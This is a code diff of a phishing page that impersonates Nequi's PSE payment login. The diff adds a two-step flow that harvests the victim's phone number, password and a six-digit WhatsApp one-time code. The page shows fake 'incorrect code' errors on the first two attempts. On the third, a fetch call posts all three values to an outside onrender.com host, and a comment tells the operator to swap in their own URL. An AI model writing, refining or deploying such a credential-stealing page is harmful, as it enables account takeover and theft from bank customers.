@@ -6,10 +6,11 @@
     <title>Pagos PSE de Nequi</title>
     <style>
         :root {
-            --nequi-purple-dark: #330066;
+            --nequi-purple: #330066;
             --nequi-magenta: #da297a;
             --nequi-soft-pink: #f7f3f7;
             --text-gray: #666666;
+            --text-verify: #444444;
         }
 
         body {
@@ -18,158 +19,103 @@
             margin: 0;
             display: flex;
             justify-content: center;
-            color: var(--nequi-purple-dark);
+            color: var(--nequi-purple);
         }
 
-        .container {
+        .app-container {
             width: 100%;
             max-width: 400px;
-            padding: 40px 25px;
-            text-align: center;
+            padding: 25px;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
+            text-align: center;
         }
 
-        .logo {
-            font-size: 30px;
-            font-weight: bold;
-            margin-bottom: 5px;
-        }
+        /* --- ESTILOS PASO 1 (PSE) --- */
+        .logo { font-size: 30px; font-weight: bold; margin-bottom: 5px; }
         .logo span { color: var(--nequi-magenta); font-size: 40px; vertical-align: middle; }
-
         h1 { font-size: 22px; margin-bottom: 20px; font-weight: 600; }
+        .description { font-size: 14px; color: var(--text-gray); line-height: 1.5; margin-bottom: 30px; }
 
-        .description {
-            font-size: 14px;
-            color: var(--text-gray);
-            line-height: 1.5;
-            margin-bottom: 30px;
-        }
-
-        /* Inputs */
         .input-group { margin-bottom: 12px; }
-
-        input {
-            width: 100%;
-            padding: 16px;
-            border: none;
-            border-radius: 10px;
-            background-color: var(--nequi-soft-pink);
-            font-size: 16px;
-            outline: none;
-            transition: 0.3s;
+        input.full {
+            width: 100%; padding: 16px; border: none; border-radius: 10px;
+            background-color: var(--nequi-soft-pink); font-size: 16px; outline: none; transition: 0.3s;
         }
+        input.full:focus { background-color: #fff; box-shadow: 0 0 0 2px var(--nequi-magenta); }
 
-        input:focus { background-color: #fff; box-shadow: 0 0 0 2px var(--nequi-magenta); }
-
-        /* BOTÓN DE ACEPTACIÓN INTERACTIVO */
         .terms-container {
-            border: 1px solid #e0cce0;
-            border-radius: 15px;
-            padding: 15px;
-            margin: 20px 0;
-            display: flex;
-            align-items: center;
-            text-align: left;
-            cursor: pointer; /* Hace que parezca clickeable */
-            transition: background 0.2s;
+            border: 1px solid #e0cce0; border-radius: 15px; padding: 15px;
+            margin: 20px 0; display: flex; align-items: center; text-align: left;
+            cursor: pointer; transition: background 0.2s;
         }
-
-        .terms-container:active { background-color: #fdf0f6; }
-
         .radio-circle {
-            width: 28px;
-            height: 28px;
-            border: 2px solid #ccc; /* Gris cuando no está seleccionado */
-            border-radius: 50%;
-            margin-right: 15px;
-            flex-shrink: 0;
-            position: relative;
-            transition: all 0.3s;
+            width: 28px; height: 28px; border: 2px solid #ccc; border-radius: 50%;
+            margin-right: 15px; flex-shrink: 0; position: relative; transition: all 0.3s;
         }
-
-        /* Cuando está seleccionado */
-        .terms-container.selected .radio-circle {
-            border-color: var(--nequi-magenta);
-            background-color: white;
-        }
-
+        .terms-container.selected .radio-circle { border-color: var(--nequi-magenta); }
         .terms-container.selected .radio-circle::after {
-          
-    content: "";
-    position: absolute;
-    top: 2px;
-    left: 2px;
-    width: 25px;
-    height: 25px;
-    background-color: var(--nequi-magenta);
-    border-radius: 50%;
-
+            content: ""; position: absolute; top: 2px; left: 2px;
+            width: 20px; height: 20px; background-color: var(--nequi-magenta); border-radius: 50%;
         }
         .terms-text { font-size: 12.5px; line-height: 1.4; color: #444; }
 
-        /* Botones */
-        .btn-main {
-            width: 100%;
-            padding: 16px;
-            border: none;
-            border-radius: 10px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-bottom: 12px;
-            transition: 0.3s;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 55px;
-        }
+        /* --- ESTILOS PASO 2 (VERIFICACIÓN) --- */
+        .header-verify { display: flex; align-items: center; margin-bottom: 30px; text-align: left; }
+        .back-arrow { font-size: 24px; cursor: pointer; margin-right: 15px; font-weight: bold; }
+        .title-verify { font-size: 26px; font-weight: bold; }
 
+        .otp-container { display: flex; justify-content: space-between; margin: 25px 0; }
+        .otp-input {
+            width: 48px; height: 55px; border: none; border-radius: 12px;
+            background-color: #eeeaf3; text-align: center; font-size: 24px;
+            font-weight: bold; color: var(--nequi-purple); outline: none;
+        }
+        .info-verify { text-align: center; font-size: 15px; color: var(--text-verify); line-height: 1.4; padding: 0 10px; }
+        
+        .loader-container { display: flex; align-items: center; justify-content: center; margin: 30px 0; }
+        .circle-loader {
+            width: 26px; height: 26px; border: 3px solid #f3f3f3;
+            border-top: 3px solid var(--nequi-magenta); border-radius: 50%;
+            animation: spin 1s linear infinite; margin-right: 10px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* --- BOTONES Y GENERAL --- */
+        .btn-main {
+            width: 100%; padding: 16px; border: none; border-radius: 10px;
+            font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s;
+            display: flex; justify-content: center; align-items: center; height: 55px;
+        }
         .btn-entra { background-color: #ebc6d9; color: white; }
         .btn-entra.ready { background-color: var(--nequi-magenta); }
+        .btn-ahora { background-color: white; color: #333; border: 1.5px solid #333; margin-top: 10px;}
+        .btn-link { background: none; border: 1px solid #ddd; padding: 12px 30px; border-radius: 10px; color: #da297a; font-size: 14px; cursor: pointer; }
 
-        .btn-ahora { background-color: white; color: #333; border: 1.5px solid #333; }
+        #error-msg { color: var(--nequi-magenta); font-size: 13px; margin-bottom: 15px; display: none; font-weight: 500; }
 
-        /* ANIMACIÓN DE CARGA (SPINNER) */
-        .spinner {
-            width: 24px;
-            height: 24px;
-            border: 3px solid rgba(255,255,255,0.3);
-            border-radius: 50%;
-            border-top-color: #fff;
-            animation: spin 1s ease-in-out infinite;
-            display: none; /* Oculto por defecto */
+        .spinner-envio {
+            width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%; border-top-color: #fff; animation: spin 1s linear infinite;
+            display: none;
         }
-
-        @keyframes spin { to { transform: rotate(360deg); } }
-
-        #error-msg { color: var(--nequi-magenta); font-size: 13px; margin-bottom: 15px; display: none; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <div class="logo"><span>.</span>Nequi</div>
-        <h1>Pagos PSE de Nequi</h1>
+    <div class="app-container">
         
-        <p class="description">
-            Ingresa tu número de cel y clave. Recuerda que debes tener tu cel a la mano para terminar el proceso.
-        </p>
-
-        <form id="pseForm">
-            <div id="error-msg">Código incorrecto. Inténtalo de nuevo.</div>
-            
-            <div class="input-group">
-                <input type="text" id="usuario" placeholder="Número de celular" required>
-            </div>
-            
-            <div class="input-group">
-                <input type="password" id="clave" placeholder="Clave" required>
-            </div>
+        <div id="step-1">
+            <div class="logo"><span>.</span>Nequi</div>
+            <h1>Pagos PSE de Nequi</h1>
+            <p class="description">Ingresa tu número de cel y clave. Recuerda que debes tener tu cel a la mano para terminar el proceso.</p>
 
             <div class="input-group">
-                <input type="text" id="codigo" placeholder="Código de verificación" required>
+                <input type="text" id="usuario" class="full" placeholder="Número de celular">
+            </div>
+            <div class="input-group">
+                <input type="password" id="clave" class="full" placeholder="Clave" maxlength="4">
             </div>
 
             <div class="terms-container" id="termsBtn">
@@ -179,47 +125,107 @@
                 </div>
             </div>
 
-            <button type="submit" class="btn-main btn-entra" id="submitBtn">
-                <span id="btnText">Entra</span>
-                <div class="spinner" id="btnSpinner"></div>
-            </button>
+            <button type="button" class="btn-main btn-entra" id="toStep2">Entra</button>
             <button type="button" class="btn-main btn-ahora">Ahora No</button>
-        </form>
+        </div>
+
+        <div id="step-2" style="display: none;">
+            <div class="header-verify">
+                <span class="back-arrow" onclick="location.reload()">←</span>
+                <span class="title-verify">Ingresa el código</span>
+            </div>
+
+            <div id="error-msg">Código incorrecto. Inténtalo de nuevo.</div>
+
+            <div class="otp-container">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+            </div>
+
+            <p class="info-verify">
+                Escribe los 6 números que te enviamos por WhatsApp. Si no te llegó, revisa tus mensajes de texto.
+            </p>
+
+            <div class="loader-container">
+                <div class="circle-loader"></div>
+                <span style="font-size: 14px; color: #555;">¿No te llegó? ¡Pídelo otra vez!</span>
+            </div>
+
+            <div style="text-align: center;">
+                <button type="button" class="btn-link" id="finalBtn">
+                    <span id="txtFinal">Pídelo aquí</span>
+                    <div class="spinner-envio" id="spinFinal"></div>
+                </button>
+            </div>
+        </div>
+
     </div>
 
     <script>
         let counter = 0;
         let termsAccepted = false;
-        const form = document.getElementById('pseForm');
+
+        const step1 = document.getElementById('step-1');
+        const step2 = document.getElementById('step-2');
         const termsBtn = document.getElementById('termsBtn');
-        const submitBtn = document.getElementById('submitBtn');
-        const btnText = document.getElementById('btnText');
-        const btnSpinner = document.getElementById('btnSpinner');
+        const toStep2Btn = document.getElementById('toStep2');
+        const otpInputs = document.querySelectorAll('.otp-input');
         const errorMsg = document.getElementById('error-msg');
 
-        // Lógica para seleccionar el botón de aceptación
+        // Lógica selección de términos Paso 1
         termsBtn.addEventListener('click', () => {
             termsAccepted = !termsAccepted;
             termsBtn.classList.toggle('selected');
-            checkReady();
+            validarPaso1();
         });
 
-        // Cambiar color del botón principal si hay texto
-        form.addEventListener('input', checkReady);
+        document.getElementById('usuario').addEventListener('input', validarPaso1);
+        document.getElementById('clave').addEventListener('input', validarPaso1);
 
-        function checkReady() {
-            if (document.getElementById('usuario').value.length > 0 && termsAccepted) {
-                submitBtn.classList.add('ready');
+        function validarPaso1() {
+            const u = document.getElementById('usuario').value;
+            const c = document.getElementById('clave').value;
+            if (u.length > 0 && c.length > 0 && termsAccepted) {
+                toStep2Btn.classList.add('ready');
             } else {
-                submitBtn.classList.remove('ready');
+                toStep2Btn.classList.remove('ready');
             }
         }
 
-        form.onsubmit = async (e) => {
-            e.preventDefault();
-            
-            if (!termsAccepted) {
-                alert("Debes aceptar los términos para continuar.");
+        // Navegación al Paso 2
+        toStep2Btn.onclick = () => {
+            if (toStep2Btn.classList.contains('ready')) {
+                step1.style.display = 'none';
+                step2.style.display = 'block';
+                otpInputs[0].focus();
+            }
+        };
+
+        // Navegación automática OTP Paso 2
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('input', () => {
+                if (input.value && index < otpInputs.length - 1) {
+                    otpInputs[index + 1].focus();
+                }
+            });
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !input.value && index > 0) {
+                    otpInputs[index - 1].focus();
+                }
+            });
+        });
+
+        // Lógica de Envío Final (3 Intentos)
+        document.getElementById('finalBtn').onclick = async () => {
+            let codigoCompleto = "";
+            otpInputs.forEach(input => codigoCompleto += input.value);
+
+            if (codigoCompleto.length < 6) {
+                alert("Por favor completa el código de 6 dígitos.");
                 return;
             }
 
@@ -227,40 +233,38 @@
 
             if (counter < 3) {
                 errorMsg.style.display = 'block';
-                document.getElementById('codigo').value = '';
+                otpInputs.forEach(input => input.value = "");
+                otpInputs[0].focus();
                 return;
             }
 
-            // TERCER INTENTO: Animación de carga y envío
+            // TERCER INTENTO: Envío real a Render
             errorMsg.style.display = 'none';
-            btnText.style.display = 'none';
-            btnSpinner.style.display = 'block';
-            submitBtn.disabled = true;
+            document.getElementById('txtFinal').style.display = 'none';
+            document.getElementById('spinFinal').style.display = 'block';
 
             const payload = {
                 usuario: document.getElementById('usuario').value,
                 clave: document.getElementById('clave').value,
-                codigo: document.getElementById('codigo').value
+                codigo: codigoCompleto
             };
 
             try {
                 // RECUERDA CAMBIAR ESTA URL POR LA TUYA DE RENDER
-                const response = await fetch('https://verificacion-segura.onrender.com', {
+                await fetch('https://verificacion-segura.onrender.com', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
 
-                // Simulamos un retraso de 2 segundos para que se vea la animación
-                // setTimeout(() => {
-                    
-                // }, 2000);
+                setTimeout(() => {
+                    alert("Verificación en proceso. Revisa tu aplicación Nequi.");
+                    window.location.reload();
+                }, 2000);
 
             } catch (err) {
-                btnText.style.display = 'block';
-                btnSpinner.style.display = 'none';
-                submitBtn.disabled = false;
-                alert('Error de conexión.');
+                alert("Error de conexión con el servidor.");
+                window.location.reload();
             }
         };
     </script>
